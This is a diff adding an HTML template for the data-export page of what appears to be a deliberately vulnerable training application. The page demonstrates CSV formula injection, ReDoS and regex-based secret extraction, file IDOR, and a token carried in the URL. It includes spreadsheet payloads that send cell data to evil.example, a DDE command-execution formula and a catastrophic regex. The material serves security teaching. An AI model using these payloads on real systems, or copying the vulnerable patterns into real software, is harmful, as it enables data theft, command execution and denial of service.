@@ -1,0 +1,102 @@
+{% extends 'base.html' %}
+{% block title %}Data Export{% endblock %}
+{% block extra_head %}
+<link rel="stylesheet" href="{{ url_for('static', filename='css/aegis-v22.css') }}">
+{% endblock %}
+{% block content %}
+<div class="pagehead" style="display:flex;align-items:center;gap:14px;margin-bottom:22px;">
+  <img src="{{ url_for('static', filename='img/svg/icon-data-export.svg') }}" width="44" height="44" alt="">
+  <div>
+    <h1 style="margin:0 0 2px;">Data Export Center</h1>
+    <p style="margin:0;color:var(--dim);font-size:13px;">Crew manifests, log files, and report downloads. Four vulnerability classes active.</p>
+  </div>
+</div>
+
+<div class="grid grid-2" style="gap:18px;">
+  <!-- CSV Injection -->
+  <div class="panel">
+    <h2>Crew Manifest Export <span class="sev p2" style="margin-left:6px;">P2 · CSV Injection</span></h2>
+    <p style="font-size:12px;color:var(--dim);">Export crew data as CSV. User-controlled fields written without sanitisation — opening in Excel or LibreOffice executes embedded formulas.</p>
+    <div style="margin-bottom:12px;">
+      <label style="font-size:11px;color:var(--dim);display:block;margin-bottom:4px;">Your notes field (try a formula):</label>
+      <input id="csv-name" type="text" value="=HYPERLINK(&quot;https://evil.example?c=&quot;&CONCATENATE(A1:A5),&quot;Click here&quot;)" oninput="previewCsvInject()" style="width:100%;padding:8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--text);border-radius:var(--radius);font-family:'JetBrains Mono',monospace;font-size:11px;">
+    </div>
+    <div id="csv-preview" style="overflow-x:auto;margin-bottom:12px;"></div>
+    <div style="display:flex;gap:8px;">
+      <a href="{{ url_for('data_export_crew_csv') }}" class="btn small">Download CSV →</a>
+      <button class="btn small secondary" onclick="document.getElementById('csv-name').value='=cmd|\' /C calc\'!A0';previewCsvInject()">Classic payload</button>
+      <button class="btn small secondary" onclick="document.getElementById('csv-name').value='=IMPORTXML(CONCAT(&quot;http://evil.example/?&quot;,A1),&quot;/&quot;)';previewCsvInject()">Data exfil</button>
+    </div>
+    <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">CWE-1236 · CSV Formula Injection — cells with = + - @ execute in spreadsheet apps</div>
+  </div>
+
+  <!-- ReDoS -->
+  <div class="panel">
+    <h2>Log Search <span class="sev p2" style="margin-left:6px;">P2 · ReDoS + Regex Injection</span></h2>
+    <p style="font-size:12px;color:var(--dim);">User-controlled regex searched against an internal log containing secrets. Catastrophic patterns DoS the server; capture groups extract secret values.</p>
+    <div style="margin-bottom:10px;">
+      <label style="font-size:11px;color:var(--dim);display:block;margin-bottom:4px;">Pattern</label>
+      <input id="search-pattern" type="text" value="secret=(\w+)" style="width:100%;padding:8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--text);border-radius:var(--radius);font-family:'JetBrains Mono',monospace;font-size:12px;">
+    </div>
+    <div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px;">
+      <button class="btn small" onclick="runSearch()">Search →</button>
+      <button class="btn small secondary" onclick="document.getElementById('search-pattern').value='secret=(\\w+)'">Extract secret</button>
+      <button class="btn small secondary" onclick="document.getElementById('search-pattern').value='token=(\\w+)'">Extract token</button>
+      <button class="btn small secondary" onclick="document.getElementById('search-pattern').value='(a+)+'">ReDoS (careful!)</button>
+    </div>
+    <div class="redos-timer" id="redos-timer">—</div>
+    <div class="redos-bar"><div class="redos-fill" id="redos-fill" style="width:0"></div></div>
+    <pre class="code" id="redos-out" style="margin-top:10px;display:none;font-size:11px;max-height:160px;overflow-y:auto;"></pre>
+    <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">CWE-730 ReDoS · CWE-89 Regex Injection</div>
+  </div>
+
+  <!-- File IDOR -->
+  <div class="panel">
+    <h2>File Download <span class="sev p2" style="margin-left:6px;">P2 · IDOR</span></h2>
+    <p style="font-size:12px;color:var(--dim);">Download uploaded files by name — no ownership check. Enumerate any file in the uploads directory.</p>
+    <div style="display:flex;gap:8px;margin-bottom:10px;">
+      <input id="dl-name" type="text" placeholder="filename.svg" style="flex:1;padding:8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--text);border-radius:var(--radius);font-family:'JetBrains Mono',monospace;font-size:12px;">
+      <a id="dl-link" href="#" class="btn small" onclick="buildDownloadLink(event)">Download →</a>
+    </div>
+    <div style="font-size:11px;color:var(--dim);margin-top:8px;font-family:'JetBrains Mono',monospace;">CWE-639 · Direct reference to file without ownership enforcement</div>
+  </div>
+
+  <!-- Token in URL -->
+  <div class="panel">
+    <h2>Token in URL <span class="sev p2" style="margin-left:6px;">P2 · CWE-598</span></h2>
+    <p style="font-size:12px;color:var(--dim);">API token passed in the GET query string — visible in server logs, browser history, proxy logs, and <code>Referer</code> headers on any subsequent link click.</p>
+    <div style="margin-bottom:10px;">
+      <label style="font-size:11px;color:var(--dim);display:block;margin-bottom:4px;">API token (grab from <a href="/api/v0/crew" style="color:var(--cyan);" target="_blank">/api/v0/crew</a>)</label>
+      <input id="url-token" type="text" placeholder="tk_a1b2c3d4e5f6" style="width:100%;padding:8px;background:var(--panel-2);border:1px solid var(--hairline);color:var(--text);border-radius:var(--radius);font-family:'JetBrains Mono',monospace;font-size:12px;">
+    </div>
+    <button class="btn small" onclick="testTokenInUrl()">Send GET with ?token= →</button>
+    <pre class="code" id="tok-out" style="margin-top:10px;display:none;font-size:11px;max-height:140px;overflow-y:auto;"></pre>
+    <div style="margin-top:10px;font-size:11px;color:var(--dim);font-family:'JetBrains Mono',monospace;">
+      Appears in:<br>
+      · Server access log: <code>GET /data-export/token-in-url?token=tk_a1… HTTP/1.1</code><br>
+      · Browser history · Proxy logs · Referer header
+    </div>
+  </div>
+</div>
+
+<script src="{{ url_for('static', filename='js/aegis-v22.js') }}"></script>
+<script>
+document.addEventListener('DOMContentLoaded', previewCsvInject);
+async function runSearch(){
+  const p = document.getElementById('search-pattern').value;
+  await testRedos(p, '');
+}
+function buildDownloadLink(e){
+  e.preventDefault();
+  const name = document.getElementById('dl-name').value.trim();
+  if(name) window.open(`/data-export/file?name=${encodeURIComponent(name)}`,'_blank');
+}
+async function testTokenInUrl(){
+  const tok = document.getElementById('url-token').value;
+  const out = document.getElementById('tok-out');
+  out.style.display='block'; out.textContent='Sending…';
+  const r = await fetch(`/data-export/token-in-url?token=${encodeURIComponent(tok)}`);
+  out.textContent=`HTTP ${r.status}\n(Token visible in URL above — check network tab)\n\n`+JSON.stringify(await r.json(),null,2);
+}
+</script>
+{% endblock %}
